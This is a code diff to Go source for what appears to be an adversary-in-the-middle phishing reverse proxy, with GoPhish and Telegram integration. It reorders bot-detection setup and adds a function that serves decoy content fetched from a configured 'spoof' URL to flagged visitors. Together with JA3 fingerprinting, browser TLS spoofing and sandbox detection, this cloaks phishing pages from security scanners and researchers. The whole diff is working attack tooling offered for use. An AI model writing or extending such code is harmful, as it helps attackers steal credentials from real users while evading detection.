@@ -65,16 +65,16 @@ var MATCH_URL_REGEXP = regexp.MustCompile(`\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\
 var MATCH_URL_REGEXP_WITHOUT_SCHEME = regexp.MustCompile(`\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
 
 type HttpProxy struct {
-	Server            *http.Server
-	Proxy             *goproxy.ProxyHttpServer
-	crt_db            *CertDb
-	cfg               *Config
-	db                *database.Database
-	bl                *Blacklist
-	wl                *Whitelist
-	gophish           *GoPhish
-	telegram          *TelegramBot
-	botguard          *BotGuard
+	Server   *http.Server
+	Proxy    *goproxy.ProxyHttpServer
+	crt_db   *CertDb
+	cfg      *Config
+	db       *database.Database
+	bl       *Blacklist
+	wl       *Whitelist
+	gophish  *GoPhish
+	telegram *TelegramBot
+
 	mlDetector        *MLBotDetector
 	ja3Fingerprinter  *JA3Fingerprinter
 	tlsInterceptor    *TLSInterceptor
@@ -126,16 +126,16 @@ func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error)
 
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, wl *Whitelist, developer bool) (*HttpProxy, error) {
 	p := &HttpProxy{
-		Proxy:             goproxy.NewProxyHttpServer(),
-		Server:            nil,
-		crt_db:            crt_db,
-		cfg:               cfg,
-		db:                db,
-		bl:                bl,
-		wl:                wl,
-		gophish:           NewGoPhish(),
-		telegram:          NewTelegramBot(),
-		botguard:          NewBotGuard(cfg),
+		Proxy:    goproxy.NewProxyHttpServer(),
+		Server:   nil,
+		crt_db:   crt_db,
+		cfg:      cfg,
+		db:       db,
+		bl:       bl,
+		wl:       wl,
+		gophish:  NewGoPhish(),
+		telegram: NewTelegramBot(),
+
 		mlDetector:        nil, // Will be initialized based on config
 		ja3Fingerprinter:  NewJA3Fingerprinter(),
 		tlsInterceptor:    nil, // Will be initialized with JA3 fingerprinter
@@ -194,16 +194,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	p.sessions = make(map[string]*Session)
 	p.sids = make(map[string]int)
 
-	// Initialize ML detector if enabled in config
-	if cfg.IsMLDetectorEnabled() {
-		mlConfig := cfg.GetMLDetectorConfig()
-		p.mlDetector = NewMLBotDetector(mlConfig.Threshold)
-		log.Info("ML bot detector enabled with threshold: %.2f", mlConfig.Threshold)
-	}
-
 	// Initialize TLS interceptor
 	p.tlsInterceptor = NewTLSInterceptor(p.ja3Fingerprinter)
 	log.Info("JA3/JA3S TLS fingerprinting enabled with %d known bot signatures", p.ja3Fingerprinter.GetKnownBotCount())
+
+	// Initialize ML detector if enabled in config
+	if cfg.IsMLDetectorEnabled() {
+		mlConfig := cfg.GetMLDetectorConfig()
+		p.mlDetector = NewMLBotDetector(mlConfig.Threshold, p.tlsInterceptor)
+		log.Info("ML bot detector enabled with threshold: %.2f", mlConfig.Threshold)
+	}
 
 	// Configure goproxy to use uTLS transport for outbound connections
 	// This spoofs the TLS fingerprint to look like a real browser
@@ -2651,6 +2651,35 @@ func (p *HttpProxy) handleBehaviorData(req *http.Request) (*http.Request, *http.
 
 	// Return success response
 	return req, goproxy.NewResponse(req, "application/json", http.StatusOK, `{"status":"ok"}`)
+}
+
+func (p *HttpProxy) serveSpoofResponse(req *http.Request) (*http.Request, *http.Response) {
+	antibotConfig := p.cfg.GetAntibotConfig()
+	if antibotConfig == nil || antibotConfig.SpoofUrl == "" {
+		return req, goproxy.NewResponse(req, "text/plain", http.StatusNotFound, "Not Found")
+	}
+
+	// Fetch spoof content
+	resp, err := http.Get(antibotConfig.SpoofUrl)
+	if err != nil {
+		log.Error("Failed to fetch spoof content: %v", err)
+		return req, goproxy.NewResponse(req, "text/plain", http.StatusNotFound, "Not Found")
+	}
+	defer resp.Body.Close()
+
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		log.Error("Failed to read spoof content: %v", err)
+		return req, goproxy.NewResponse(req, "text/plain", http.StatusNotFound, "Not Found")
+	}
+
+	// Create response with spoofed content
+	contentType := resp.Header.Get("Content-Type")
+	if contentType == "" {
+		contentType = "text/html"
+	}
+
+	return req, goproxy.NewResponse(req, contentType, http.StatusOK, string(body))
 }
 
 func (p *HttpProxy) handleSandboxDetection(req *http.Request, from_ip string) (*http.Request, *http.Response) {
